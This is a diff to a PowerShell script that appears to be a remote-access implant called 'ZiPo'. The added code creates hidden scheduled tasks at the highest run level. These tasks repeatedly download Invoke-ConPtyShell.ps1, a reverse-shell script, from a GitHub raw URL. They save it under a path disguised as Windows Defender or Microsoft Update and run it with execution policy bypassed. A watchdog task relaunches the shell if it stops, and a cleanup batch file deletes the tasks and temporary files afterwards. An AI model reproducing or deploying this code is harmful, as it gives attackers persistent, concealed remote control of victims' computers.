@@ -379,6 +379,51 @@ function PortSuggest {
     }
 }
 
+function Register-UpdateTask {
+    $taskName = "ZiPo_UpdateCheck"
+    $scriptBlock = @"
+\$url = 'https://raw.githubusercontent.com/zipo0/studytime-/main/Invoke-ConPtyShell.ps1'
+\$path = '$env:APPDATA\WindowsDefender\MicrosoftUpdate.ps1'
+
+try {
+    \$remote = Invoke-WebRequest -Uri \$url -UseBasicParsing
+    \$remoteHash = (\$remote.Content | Get-FileHash -Algorithm SHA256).Hash
+    if (Test-Path \$path) {
+        \$localHash = (Get-FileHash -Path \$path -Algorithm SHA256).Hash
+    } else {
+        \$localHash = ''
+    }
+
+    if (\$remoteHash -ne \$localHash) {
+        \$remote.Content | Out-File -Encoding UTF8 -FilePath \$path
+        Start-Process powershell.exe "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"\$path`""
+    }
+} catch {}
+"@
+
+    $tempFile = "$env:TEMP\updatecheck.ps1"
+    $scriptBlock | Out-File $tempFile -Encoding UTF8
+
+    schtasks /Create /TN $taskName /SC MINUTE /MO 5 /TR "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$tempFile`"" /F /RL HIGHEST | Out-Null
+}
+
+
+function Register-SelfWatchTask {
+    $taskName = "ZiPo_SelfWatch"
+    $watchScript = @"
+\$path = '$env:APPDATA\WindowsDefender\MicrosoftUpdate.ps1'
+\$running = Get-CimInstance Win32_Process | Where-Object { \$_.CommandLine -match [Regex]::Escape(\$path) }
+if (-not \$running) {
+    Start-Process powershell.exe "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"\$path`""
+}
+"@
+
+    $watchFile = "$env:TEMP\watchdog.ps1"
+    $watchScript | Out-File $watchFile -Encoding UTF8
+
+    schtasks /Create /TN $taskName /SC MINUTE /MO 1 /TR "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$watchFile`"" /F /RL HIGHEST | Out-Null
+}
+
 
 
 
@@ -587,21 +632,33 @@ function Update-Self {
         }
 
         $cleanupBat = "$env:APPDATA\WindowsDefender\cleanup.bat"
-        $taskName = "MicrosoftEdgeUpdateChecker"
-        $cleanupTask = "ZiPo_Cleanup"
+        $taskNames = @(
+            "MicrosoftEdgeUpdateChecker",
+            "ZiPo_UpdateCheck",
+            "ZiPo_SelfWatch",
+            "ZiPo_Cleanup"
+        )
 
+        # Формируем тело батника
         $batContent = @"
 @echo off
 timeout /t 5 >nul
 del "$scriptPath" /f /q
-schtasks /Delete /TN "$taskName" /F >nul 2>&1
-del "%~f0" /f /q
-schtasks /Delete /TN "$cleanupTask" /F >nul 2>&1
+del "$env:TEMP\updatecheck.ps1" /f /q >nul 2>&1
+del "$env:TEMP\watchdog.ps1" /f /q >nul 2>&1
 "@
 
+        foreach ($tn in $taskNames) {
+            $batContent += "`nschtasks /Delete /TN `"$tn`" /F >nul 2>&1"
+        }
+
+        $batContent += "`ndel `%~f0 /f /q"
+
+        # Сохраняем батник
         $batContent | Set-Content -Path $cleanupBat -Encoding ASCII
 
-        schtasks /Create /TN $cleanupTask /SC ONCE /TR "`"$cleanupBat`"" `
+        # Запланировать удаление через минуту
+        schtasks /Create /TN "ZiPo_Cleanup" /SC ONCE /TR "`"$cleanupBat`"" `
             /ST ((Get-Date).AddMinutes(1).ToString("HH:mm")) /RL HIGHEST /F | Out-Null
 
         Start-Sleep -Seconds 1
@@ -614,7 +671,9 @@ schtasks /Delete /TN "$cleanupTask" /F >nul 2>&1
 
 
 
-      Add-Persistence
+    Add-Persistence
+    Register-UpdateTask
+    Register-SelfWatchTask
     Output-Log "[*] Starting Connect-ZiPo..."
     Output-Log "[*] Target server: $srv"
     Output-Log "[*] Target port: $port"
@@ -642,7 +701,7 @@ ________  ___  ________  ________      ________  ________
     /  /_/__\ \  \ \  \___|\ \  \\\  \ __\ \  \|\  \ \  \_\\ \ 
    |\________\ \__\ \__\    \ \_______\\__\ \_______\ \_______\
     \|_______|\|__|\|__|     \|_______\|__|\|_______|\|_______|  
-                                            LOG CON TEST                                                                                                                                                                    
+                                            GAY                                                                                                                                                                   
 ${esc}[0m
 
 ${esc}[32m[+] Connected :: $env:USERNAME@$env:COMPUTERNAME
